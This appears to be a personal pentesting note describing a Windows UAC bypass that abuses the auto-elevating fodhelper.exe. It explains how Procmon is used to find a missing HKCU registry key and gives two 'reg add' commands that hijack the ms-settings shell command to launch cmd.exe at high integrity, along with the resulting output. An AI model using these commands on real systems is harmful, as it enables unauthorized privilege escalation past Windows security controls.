---
title: UAC Bypass
date: M02-02-2023
author: i4
---

## Example bypass
- Only works on Windows 10 1709

### fodhelper.exe

**Path**:  `C:\Windows\System32\fodhelper.exe``

[Sigcheck][sigcheck] dumps the manifest of `fodhelper.exe` which shows that it always runs auto-elevated:
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- Copyright (c) Microsoft Corporation -->
<assembly
   xmlns="urn:schemas-microsoft-com:asm.v1"
   xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
   manifestVersion="1.0">
 <assemblyIdentity type="win32" publicKeyToken="6595b64144ccf1df" name="Microsoft.Windows.FodHelper" version="5.1.0.0" processorArchitecture="x86"/>
 <description>Features On Demand Helper UI</description>
 <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
  <security>
      <requestedPrivileges>
          <requestedExecutionLevel
            level="requireAdministrator"
          />
      </requestedPrivileges>
  </security>
 </trustInfo>
 <asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
        <dpiAware>true</dpiAware>
        <autoElevate>true</autoElevate>
    </asmv3:windowsSettings>
 </asmv3:application>
</assembly>
```


[Procmon][Procmon] is used to see what registry entries it loads at the start.
- Set the following filters:
	- `Image Path is C:\Windows\System32\fodhelper.exe then Include`
	- `Result is NAME NOT FOUND then Include`

Since a normal user can not alter the `HKLM` and the `HKCR` hive, we can narrow down further:
- Filter:
	- `PATH begins with HKCU then Include`

We see that `fodhelper.exe` tries to execute the operation `ReqQueryValue` on the key `HKCU:\Software\Classes\ms-settings\URL Protocol` but fails because it does not exist yet. If we filter on `ms-settings\Shell\Open\Command` we find out that it has a fallback in `HKCR\ms-setings\Shell\Open\Command` which has the following value:

_HKCR\\ms-settings\\Shell\\Open\\Command_
```Registry
C:\>reg query HKCR\ms-settings\shell\open\command

HKEY_CLASSES_ROOT\ms-settings\shell\open\command
    DelegateExecute    REG_SZ    {4ed3a719-cea8-4bd9-910d-e252f997afc2}
```

`{4ed3a719-cea8-4bd9-910d-e252f997afc2}` refers to a [COM object](https://learn.microsoft.com/en-us/windows/win32/com/the-component-object-model) which gets started with inherited permissions.

Since this example doesn't hijack the flow with a com object, we can add the missing registry path & an empty `DelegateExecute` key.
```cmd
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f

```

Starting `foodhelper.exe` again we should now get a `cmd.exe` with high integrity:
```cmd
C:\Windows\System32> whoami /groups
...
Mandatory Label\High Mandatory Level
```

## Tools
-[Sigcheck]:  <https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck>
-[Procmon]:  <https://learn.microsoft.com/en-us/sysinternals/downloads/procmon>

## Related notes
- [[UAC]]
- [[Process Integrity]]